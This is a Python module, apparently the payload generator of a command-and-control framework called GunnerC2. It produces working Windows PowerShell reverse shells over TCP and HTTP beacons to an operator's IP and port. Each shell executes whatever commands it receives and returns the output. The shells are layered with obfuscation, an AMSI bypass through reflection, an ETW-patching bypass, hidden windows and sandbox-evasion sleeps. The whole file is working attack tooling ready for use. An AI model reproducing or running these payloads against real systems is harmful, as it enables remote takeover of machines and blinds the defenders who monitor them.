"""
Payload Generator for GunnerC2
Provides Windows PowerShell reverse shells over TCP and HTTP,
with selectable obfuscation levels.
"""
import base64
import random
import string
import pyperclip
import re


def _random_var(length=8):
    """Generate a random variable name for obfuscation"""
    return ''.join(random.choices(string.ascii_letters, k=length))


def _wrap_base64(raw_cmd: str) -> str:
    """Wrap a raw PowerShell command in EncodedCommand base64 encoding"""
    b = raw_cmd.encode('utf-16le')
    encoded = base64.b64encode(b).decode()
    return f"powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}"


def _obfuscate_level2(raw: str) -> str:
    """Level 2: simple Base64-encode the raw command and wrap as EncodedCommand"""
    return _wrap_base64(raw)


def _obfuscate_level3(raw: str) -> str:
    """Level 3: inject random variable names and split strings"""
    var = _random_var()
    mid = len(raw) // 2
    part1, part2 = raw[:mid], raw[mid:]
    obf = (
        f"${var}1 = '{part1}';"
        f"${var}2 = '{part2}';"
        f"$cmd = ${var}1 + ${var}2;"
        "Invoke-Expression $cmd"
    )
    return _wrap_base64(obf)


def generate_windows_powershell_tcp(ip: str, port: int, obs) -> str:
    """
    Generate a Windows PowerShell TCP reverse shell using ReadLine() buffering.
    obs: 1 (raw), 2 (Base64 Encoded), 3 (variable split obfuscation)
    """

    raw = (
            f"$h='{ip}';$p={port};"
            "$c=New-Object System.Net.Sockets.TCPClient($h,$p);"
            "$s=$c.GetStream();"
            "$sr=New-Object System.IO.StreamReader($s,[System.Text.Encoding]::UTF8);"
            "while(($cmd=$sr.ReadLine())){"
            "if(!$cmd){continue};"
            "try{$o=Invoke-Expression $cmd |Out-String}catch{$o=$_.Exception.Message};"
            "$o=$o -replace '^\\s+|\\s+$','';"
            "$b=[System.Text.Encoding]::UTF8.GetBytes($o);"
            "$s.Write($b,0,$b.Length)"
            "};$c.Close()"
        )

    encoded = base64.b64encode(raw.encode('utf-16le')).decode()
    final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"

    if obs is None or obs == 0:
        pyperclip.copy(final_cmd)
        print(final_cmd)
        print("[+] Payload copied to clipboard")
        return final_cmd

    if obs == 1:
        obs1_payload = generate_windows_powershell_tcp_obfuscate_level1(raw, ip, port)
        pyperclip.copy(obs1_payload)
        print(obs1_payload)
        print("[+] Payload copied to clipboard")
        return obs1_payload

    elif obs == 2:
        obs2_payload = generate_windows_powershell_tcp_obfuscate_level2(raw, ip, port)
        pyperclip.copy(obs2_payload)
        print(obs2_payload)
        print("[+] Payload copied to clipboard")
        return obs2_payload

    elif obs == 3:
        obs3_payload = generate_windows_powershell_tcp_obfuscate_level3(raw, ip, port)
        pyperclip.copy(obs3_payload)
        print(obs3_payload)
        print("[+] Payload copied to clipboard")
        return obs3_payload


def generate_windows_powershell_tcp_obfuscate_level1(payload, ip, port):
    ip_parts = ip.split('.')
    ip_literal = "+'.'+".join(f"'{part}'" for part in ip_parts)

    # 2) Port literal (could be math, but keep it simple)
    port_literal = str(port)

    # 3) Hand-crafted, static, obfuscated template:
    one_liner = (
    f"$clf={ip_literal};"
    f"$prt={port_literal};"
    "$cl=New-Object -TypeName ('Sy'+'stem'+'.'+'Net'+'.'+'Sock'+'ets'+'.'+'TCPClient') -ArgumentList $clf,$prt;"
    "$rs=$cl.GetStream();"
    "$srdr=New-Object -TypeName ('Sy'+'stem'+'.'+'IO'+'.'+'StreamReader') -ArgumentList $rs,[System.Text.Encoding]::UTF8;"
    "while(($cmd0=$srdr.ReadLine())){if(!$cmd0){continue};"
    "try{$out1=I`nvoke-Expre`ssion $cmd0|Out-Str`ing}catch{$out1=$_.Exception.Message};"
    "$out1=$out1 -replace '^\\s+|\\s+$','';"
    "$byt2=[System.Text.Encoding]::UTF8.GetBytes($out1);"
    "$rs.Write($byt2,0,$byt2.Length)};"
    "$cl.Close();"
)

    encoded_one_liner = base64.b64encode(one_liner.encode('utf-16le')).decode()
    run_encoded = f"$KpTz='{encoded_one_liner}';$ZpxL=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($KpTz));IEX $ZpxL"
    return run_encoded


def generate_windows_powershell_tcp_obfuscate_level2(raw, ip, port):
    """
    Level 2: heavy obfuscation plus AMSI bypass via reflection.
    Embeds the provided one-liner and returns a fully EncodedCommand.
    """
    # build the "'192'+'.'+'168'+...+''" style IP literal
    ip_parts    = ip.split('.')
    ip_literal  = "+'.'+".join(f"'{part}'" for part in ip_parts)
    port_literal = str(port)

    one_liner = (
        # AMSI bypass via reflection
        "$e=[Ref].('Assem'+'bly').GetType(([string]::Join('',[char[]]"
        "(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,"
        "46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,"
        "105,108,115))));"
        "$n='Non'+'Public';"
        "$s='Static';"
        "$f=$e.GetField(([string]::Join('',[char[]]"
        "(97,109,115,105,73,110,105,116,70,97,105,108,101,100))),$n+','+$s);"
        "$t=[type[]]@([object],[bool]);"
        "$m=$f.GetType().GetMethod('Set'+'Value',$t);"
        "$m.Invoke($f,@($null,$true));"
        # build type names
        "$A=[string]::Join('',[char[]]"
        "(83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,"
        "115,46,84,67,80,67,108,105,101,110,116));"
        "$C=[string]::Join('',[char[]]"
        "(83,121,115,116,101,109,46,73,79,46,83,116,114,101,97,109,82,101,"
        "97,100,101,114));"
        # dynamic IP/port
        f"$ip={ip_literal};"
        f"$port={port_literal};"
        # connect & shell loop
        "$client=New-Object -TypeName $A;"
        "$client.Connect($ip,$port);"
        "$stream=$client.GetStream();"
        "$reader=New-Object -TypeName $C -ArgumentList @($stream,[System.Text.Encoding]::UTF8);"
        "$iex=('Invo'+'ke-Expre'+'ssion');"
        "while($cmd=$reader.ReadLine()){if(!$cmd){continue};"
        "try{$out=& $iex $cmd|Out-Str`ing}catch{$out=$_.Exception.Message};"
        "$clean=($out -replace '^\\\\s+|\\\\s+$','');"
        "$bytes=[System.Text.Encoding]::UTF8.GetBytes($clean);"
        "$stream.Write($bytes,0,$bytes.Length)};"
        "$client.Close()"
    )

    # encode for PowerShell -EncodedCommand
    encoded = base64.b64encode(one_liner.encode('utf-16le')).decode()
    return f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"

def generate_windows_powershell_tcp_obfuscate_level3(raw, ip, port):
    ip_parts = ip.split('.')
    ip_literal = "+'.'+".join(f"'{part}'" for part in ip_parts)
    port_literal = str(port)

    # Generate random variable names for some basic anti-sig obfuscation
    rnd = lambda: ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(4,8)))
    v_amsi = rnd()
    v_etw = rnd()
    v_tcp = rnd()
    v_reader = rnd()
    v_writer = rnd()
    v_cmd = rnd()
    v_out = rnd()
    v_bytes = rnd()

    one_liner = (
        # AMSI bypass (unchanged)
        "$e=[Ref].('Assem'+'bly').GetType(([string]::Join('',[char[]]"
        "(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,"
        "46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,"
        "105,108,115))));"
        "$n='Non'+'Public';"
        "$s='Static';"
        "$f=$e.GetField(([string]::Join('',[char[]]"
        "(97,109,115,105,73,110,105,116,70,97,105,108,101,100))),$n+','+$s);"
        "$t=[type[]]@([object],[bool]);"
        "$m=$f.GetType().GetMethod('Set'+'Value',$t);"
        "$m.Invoke($f,@($null,$true));"

        # ETW bypass dynamic offset calculation
        "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Win{"
        "[DllImport(\"kernel32.dll\")] public static extern IntPtr LoadLibrary(string s);"
        "[DllImport(\"kernel32.dll\")] public static extern IntPtr GetProcAddress(IntPtr m, string p);"
        "[DllImport(\"kernel32.dll\")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o); }';"
        "$k=([char[]](107,101,114,110,101,108,51,50,46,100,108,108)-join'');"
        "$n=([char[]](110,116,100,108,108,46,100,108,108)-join'');"
        "$v=([char[]](86,105,114,116,117,97,108,80,114,111,116,101,99,116)-join'');"
        "$e=([char[]](69,116,119,69,118,101,110,116,87,114,105,116,101)-join'');"
        "$mod=[Win]::LoadLibrary($k);$vp=[Win]::GetProcAddress($mod,$v);"
        "$ntbase=([System.Diagnostics.Process]::GetCurrentProcess().Modules|?{$_.ModuleName -eq $n}).BaseAddress;"
        "$peOff=$ntbase.ToInt64()+0x3C;"
        "$pe=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$peOff);"
        "$etblOff=$ntbase.ToInt64()+$pe+0x88;"
        "$expt=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$etblOff);"
        "$exptVA=$ntbase.ToInt64()+$expt;"
        "$fnCount=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x18));"
        "$fnNamesRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x20));"
        "$fnNamesVA=$ntbase.ToInt64()+$fnNamesRVA;"
        "$etwptr=0;for($i=0;$i-lt$fnCount;$i++){"
        "$nameRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($fnNamesVA+($i*4)));"
        "$namePtr=($ntbase.ToInt64()+$nameRVA);"
        "$currName=\"\";for($j=0;($c=[System.Runtime.InteropServices.Marshal]::ReadByte([IntPtr]($namePtr),$j))-ne 0;$j++)"
        "{$currName+=[char]$c};if($currName-eq$e){$etwptr=$namePtr;break}};"
        "$etwAddr=[IntPtr]$etwptr;"
        "$null=[Win]::VirtualProtect($etwAddr,[UIntPtr]::op_Explicit(1),0x40,[ref]([uint32]0));"
        "[System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr,0xC3);"

        # Random sleep for sandbox jitter
        "Start-Sleep -Milliseconds (Get-Random -Minimum 1000 -Maximum 2000);"

        # TCP Shell heavily obfuscated
        f"${v_tcp}=([char[]](83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,99,112,67,108,105,101,110,116)-join'');"
        f"${v_tcp}=[Activator]::CreateInstance(${v_tcp});"
        f"$ip={ip_literal};"
        f"$port={port_literal};"
        f"${v_tcp}.Connect($ip,$port);"
        f"$s=${v_tcp}.GetStream();"
        f"${v_reader}=New-Object IO.StreamReader($s);"
        f"${v_writer}=New-Object IO.StreamWriter($s);"
        f"while($true){{"
        f"${v_cmd}=${v_reader}.ReadLine();"
        f"if(!${v_cmd}){{break}};"
        f"try{{${v_out}=[ScriptBlock]::Create(${v_cmd}).Invoke() -join\"`n\"}}catch{{${v_out}=$_.Exception.Message}};"
        f"${v_writer}.WriteLine(${v_out});${v_writer}.Flush()}};"
        f"${v_tcp}.Close();"
    )

    encoded = base64.b64encode(one_liner.encode('utf-16le')).decode()
    final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"
    return final_cmd


def generate_windows_powershell_http(ip, port, beacon_interval, obs):
    beacon_url = f"http://{ip}:{port}/"
    interval = beacon_interval

    raw = (
        # Add the full session ID generator function
        "Function Generate-SessionID {"
        "$charset = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray();"
        "$parts = @();"
        "for ($i=0; $i -lt 3; $i++) {"
        "$part = -join (1..5 | ForEach-Object { $charset | Get-Random });"
        "$parts += $part;"
        "}"
        "return $parts -join '-'"
        "};"
        "$sid = Generate-SessionID;"

        "while($true){"
        "try{"
        f"$resp=Invoke-RestMethod -Uri '{beacon_url}' -Method GET -Headers @{{'X-Session-ID' = $sid}};"
        "$cmd_b64=$resp.cmd;"
        "if(-not [string]::IsNullOrEmpty($cmd_b64)){"
        "$raw=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cmd_b64));"
        "[Console]::OutputEncoding=[System.Text.Encoding]::ASCII;"
        "[Console]::InputEncoding=[System.Text.Encoding]::ASCII;"
        "$out=Invoke-Expression $raw 2>&1 | Out-String;"
        "$out_b64=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($out));"
        f"Invoke-RestMethod -Uri '{beacon_url}' -Method POST -Headers @{{'X-Session-ID' = $sid}} -Body (@{{output = $out_b64}} | ConvertTo-Json) -ContentType 'application/json';"
        "};"
        f"Start-Sleep -Seconds {interval};"
        "}catch{};"
        "}"
    )

    encoded = base64.b64encode(raw.encode('utf-16le')).decode()
    final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"
    

    if obs is None or obs == 0:
        pyperclip.copy(final_cmd)
        print(final_cmd)
        print("[+] Payload copied to clipboard")
        return final_cmd


    if obs == 1:
        obs1_http_payload = generate_windows_powershell_http_obfuscate_level1(raw, ip, port, beacon_interval)
        pyperclip.copy(obs1_http_payload)
        print(obs1_http_payload)
        print("[+] Payload copied to clipboard")
        return obs1_http_payload
    """elif obs == 2:
        return _obfuscate_level2(template)
    else:
        return _obfuscate_level3(template)"""


def generate_windows_powershell_http_obfuscate_level1(raw, ip, port, beacon_interval):
    beacon_url = f"http://{ip}:{port}/"
    interval = beacon_interval

    one_liner = (
    f"Function G-SID{{$c='abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray();"
    f"$p=@();1..3|%{{$p+=-join(1..5|%{{$c|Get-Random}})}};$p -join'-'}};"
    f"$sid=G-SID;$uri='{beacon_url}';"
    f"[System.Net.WebRequest]::DefaultWebProxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy();"
    f"$hdr=@{{'X-Session-ID'=$sid}};"

    # AMSI bypass
    "$e=[Ref].('Assem'+'bly').GetType(([string]::Join('',[char[]]"
    "(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))));"
    "$n='Non'+'Public';$s='Static';"
    "$f=$e.GetField(([string]::Join('',[char[]]"
    "(97,109,115,105,73,110,105,116,70,97,105,108,101,100))),$n+','+$s);"
    "$t=[type[]]@([object],[bool]);"
    "$m=$f.GetType().GetMethod('Set'+'Value',$t);"
    "$m.Invoke($f,@($null,$true));"

    # ETW bypass
    "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Win{"
    "[DllImport(\"kernel32.dll\")] public static extern IntPtr LoadLibrary(string s);"
    "[DllImport(\"kernel32.dll\")] public static extern IntPtr GetProcAddress(IntPtr m, string p);"
    "[DllImport(\"kernel32.dll\")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o); }';"
    "$k=([char[]](107,101,114,110,101,108,51,50,46,100,108,108)-join'');"
    "$n=([char[]](110,116,100,108,108,46,100,108,108)-join'');"
    "$v=([char[]](86,105,114,116,117,97,108,80,114,111,116,101,99,116)-join'');"
    "$e=([char[]](69,116,119,69,118,101,110,116,87,114,105,116,101)-join'');"
    "$mod=[Win]::LoadLibrary($k);$vp=[Win]::GetProcAddress($mod,$v);"
    "$ntbase=([System.Diagnostics.Process]::GetCurrentProcess().Modules|?{$_.ModuleName -eq $n}).BaseAddress;"
    "$peOff=$ntbase.ToInt64()+0x3C;$pe=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$peOff);"
    "$etblOff=$ntbase.ToInt64()+$pe+0x88;"
    "$expt=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$etblOff);"
    "$exptVA=$ntbase.ToInt64()+$expt;"
    "$fnCount=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x18));"
    "$fnNamesRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x20));"
    "$fnNamesVA=$ntbase.ToInt64()+$fnNamesRVA;"
    "$etwptr=0;for($i=0;$i-lt$fnCount;$i++){"
    "$nameRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($fnNamesVA+($i*4)));"
    "$namePtr=($ntbase.ToInt64()+$nameRVA);"
    "$currName=\"\";for($j=0;($c=[System.Runtime.InteropServices.Marshal]::ReadByte([IntPtr]($namePtr),$j))-ne 0;$j++){$currName+=[char]$c};"
    "if($currName-eq$e){$etwptr=$namePtr;break}};"
    "$etwAddr=[IntPtr]$etwptr;"
    "$null=[Win]::VirtualProtect($etwAddr,[UIntPtr]::op_Explicit(1),0x40,[ref]([uint32]0));"
    "[System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr,0xC3);"

    # Define GET using .NET
    "Function Get-Task {"
    "$req = [System.Net.HttpWebRequest]::Create($uri);"
    "$req.Method = 'GET';"
    "$req.Headers.Add('X-Session-ID',$sid);"
    "$resp = $req.GetResponse();"
    "$stream = $resp.GetResponseStream();"
    "$reader = New-Object System.IO.StreamReader($stream);"
    "$result = $reader.ReadToEnd();"
    "$reader.Close();$stream.Close();$resp.Close();"
    "return $result"
    "}"

    # Define POST using .NET
    "Function Send-Output($payload) {"
    "$bytes = [System.Text.Encoding]::UTF8.GetBytes($payload);"
    "$req = [System.Net.HttpWebRequest]::Create($uri);"
    "$req.Method = 'POST';"
    "$req.ContentType = 'application/json';"
    "$req.Headers.Add('X-Session-ID',$sid);"
    "$req.ContentLength = $bytes.Length;"
    "$stream = $req.GetRequestStream();"
    "$stream.Write($bytes,0,$bytes.Length);$stream.Close();"
    "$resp = $req.GetResponse();$resp.Close()"
    "}"

    # PowerShell pipeline init
    "$PSA = [AppDomain]::CurrentDomain.GetAssemblies()|?{$_ -like '*Automation*'};"
    "$PSClass = $PSA.GetType('System.Management.Automation.PowerShell');"
    "$pipeline = ($PSClass.GetMethods()|?{$_.Name -eq 'Create' -and $_.GetParameters().Count -eq 0}).Invoke($null,$null);"

    # Beacon loop
    f"while($true){{"
    "try{"
    "    $taskJson = Get-Task;"
    "    $task = ConvertFrom-Json $taskJson;"
    "    if($task.cmd){"
    "        $cmd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($task.cmd));"
    "        $pipeline.Commands.Clear();"
    "        $pipeline.AddScript($cmd)|Out-Null;"
    "        $results = $pipeline.Invoke();"
    "        $output = $results|Out-String;"
    "        $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output.Trim()));"
    "        $body = @{output=$b64}|ConvertTo-Json;"
    "        Send-Output $body;"
    "    };"
    "}"
    "catch{};"
    f"Start-Sleep -Seconds {interval};"
    "}"
)

    encoded = base64.b64encode(one_liner.encode('utf-16le')).decode()
    final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"

    return final_cmd
